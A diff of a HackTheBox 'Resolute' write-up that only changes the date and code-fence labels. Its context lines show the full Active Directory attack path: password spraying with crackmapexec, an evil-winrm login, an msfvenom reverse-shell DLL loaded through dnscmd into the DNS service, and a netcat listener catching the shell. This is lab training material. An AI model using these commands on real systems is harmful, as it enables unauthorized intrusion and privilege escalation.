@@ -1,6 +1,6 @@
 ---
 title: "Resolute"
-date: 2025-06-20
+date: 2024-11-20
 categories:
   - HackTheBox
   - Active Directory
@@ -16,7 +16,7 @@ tags:
 
 ## Enumeration
 
-```bash
+```shell
 $ nmap -sC -sV -Pn -T4 --min-rate 1000 -p- 10.10.10.169
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 21:00 CET
 Nmap scan report for 10.10.10.169
@@ -82,7 +82,7 @@ Add `megabank.local` to `/etc/hosts`
 
 We find a password hardcoded in the description of a user using `enum4linux-ng`
 
-```bash
+```shell
 =====================================
 |    Users via RPC on 10.10.10.169    |
  =====================================
@@ -128,7 +128,7 @@ We have `marko:Welcome123!`
 
 Check the password with all users and we find `melanie:Welcome123!`
 
-```bash
+```shell
 $ crackmapexec smb 10.10.10.169 -u users2 -p 'Welcome123!' 
 
 SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
@@ -162,7 +162,7 @@ SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:W
 
 Enter the host using `evil-winrm`
 
-```bash
+```shell
 $ evil-winrm -u melanie -p 'Welcome123!' -i 10.10.10.169
                                         
 Evil-WinRM shell v3.7
@@ -185,11 +185,11 @@ While enumerating the filesystem, I found a PowerShell history file in
 
 Make it visible before downloading it or `evil-winrm` will fail
 
-```bash
+```shell
 attrib -h C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
 ```
 
-```bash
+```shell
 $ cat aaa.txt       
 **********************
 ...
@@ -208,7 +208,7 @@ So `ryan:Serv3r4Admin4cc123!`
 
 Test it with `cme`
 
-```bash
+```shell
 $ crackmapexec smb 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'
 SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
@@ -216,7 +216,7 @@ SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv
 
 We can see the permissions of this user
 
-```bash
+```shell
 *Evil-WinRM* PS C:\Windows\System32> whoami /groups
 
 GROUP INFORMATION
@@ -236,7 +236,7 @@ So we can search for the program in `system32` called `dnscmd.exe`.
 
 Also, there is a note on his desktop:
 
-```bash
+```shell
 cat note.txt
 Email to team:
 
@@ -247,19 +247,19 @@ With `dnscmd.exe` we can load a DLL plugin that is a reverse shell.
 
 So, create the shell
 
-```bash
+```shell
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9090 -f dll -o reverse.dll
 ```
 
 Start an SMB share and start a listener.
 
-```bash
+```shell
 $ impacket-smbserver s .
 ```
 
 Now execute the setting of the DLL and stop and start the service for the program to load it.
 
-```bash
+```shell
 *Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.11\s\reverse.dll
 
 Registry property serverlevelplugindll successfully reset.
@@ -291,7 +291,7 @@ SERVICE_NAME: dns
 
 And we have a shell
 
-```bash
+```shell
 $ rlwrap nc -lnvp 9090                                        
 listening on [any] 9090 ...
 connect to [10.10.14.11] from (UNKNOWN) [10.10.10.169] 51688
